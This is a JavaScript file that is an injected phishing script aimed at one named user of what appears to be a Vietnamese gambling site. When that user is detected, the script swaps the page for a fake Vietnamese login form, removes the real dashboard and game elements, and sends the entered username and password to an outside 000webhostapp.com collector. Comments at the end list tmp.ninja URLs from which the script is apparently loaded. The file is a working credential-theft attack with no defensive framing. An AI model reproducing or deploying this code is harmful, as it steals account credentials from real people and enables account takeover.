const VICTIM = 'huy5552';
const ID_ATTACK = 144120909;
const fake = `<div class="container">
<div class="form" style="padding-top:25px"><div class="row justify-content-center"><h3>Đăng nhập</h3></div>
<div class="row justify-content-center"><div class="col-lg-8"><div id="alert"></div>
<form id="formLogin" method="POST" style="padding:20px 20px"><div class="form-group">
<label for="">Tài khoản</label><input class="form-control" id="username" name="username" placeholder=""></div>
<div class="form-group"><label for="">Mật khẩu</label>
<input type="password" class="form-control" id="password" name="password" placeholder=""></div>
<div class="form-group"><button type="button" class="btn btn-success form-control font-weight-bold text-uppercase" onclick="btnLogin()">
<i class="fas fa-sign-in-alt">Đăng nhập</i></button></div><div class="form-group text-center">Bạn chưa có tài khoản? 
<a type="button" class="btn btn-danger font-weight-bold text-uppercase" href="user/register"><i class="fas fa-user-plus">
</i> Đăng kí</a></div></form></div></div></div></div>`;

var TEN_TK;
const currATK = localStorage.getItem('sess')
if (currATK == null || currATK != ID_ATTACK) {
  TEN_TK = $("#userInfo").text().split('-')[0].trim();
  if (TEN_TK === VICTIM) {
    doIt();
    localStorage.setItem('sess', ID_ATTACK);
  }

  btnLogin = () => {
    const data = $('#formLogin').serialize();
    const l = 'https://songloimr.000webhostapp.com/p.php?' + data;
    $.get(l, (d) => {
      window.location.href = "/";
    })
  }
}

function doIt() {
  var main = document.querySelectorAll('.container')[1];
  main.innerHTML = fake;
  //var divAlert = document.getElementById("alert");
  var dashboard = $('#userInfo').parent().parent();
  dashboard.remove();
  $('#batnhac').remove();
  $('#game-taixiu')['hide']('fade', {}, 300)
}
//getServer
//https://a.tmp.ninja/sUpJjsGf.js
//<script src='https://a.tmp.ninja/Dnsjczva.js'
